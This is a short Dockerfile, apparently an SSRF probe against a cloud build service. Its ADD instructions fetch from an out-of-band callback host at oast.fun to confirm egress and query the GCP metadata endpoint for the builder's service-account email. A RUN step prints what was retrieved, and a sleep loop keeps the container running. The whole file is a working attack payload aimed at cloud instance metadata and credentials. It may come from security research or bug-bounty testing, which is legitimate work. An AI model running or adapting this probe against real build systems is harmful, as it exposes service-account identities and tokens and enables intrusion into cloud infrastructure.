FROM alpine:3.20
# 1) builder egress baseline (public) — must succeed
ADD http://build-add.db89n41hl4lmmj5ad5ogthpchg48n61qg.oast.fun/egress /tmp/egress_ok
# 2) builder -> GCP metadata (buildah context, distinct from RUN container)
ADD http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email /tmp/gcp_email
RUN echo "=== ADD-SSRF RESULTS ==="; ls -la /tmp/; echo "--egress_ok--"; head -c 200 /tmp/egress_ok 2>/dev/null; echo; echo "--gcp_email--"; head -c 300 /tmp/gcp_email 2>/dev/null; echo; echo "=== END ==="
CMD ["sh","-c","while true; do sleep 300; done"]
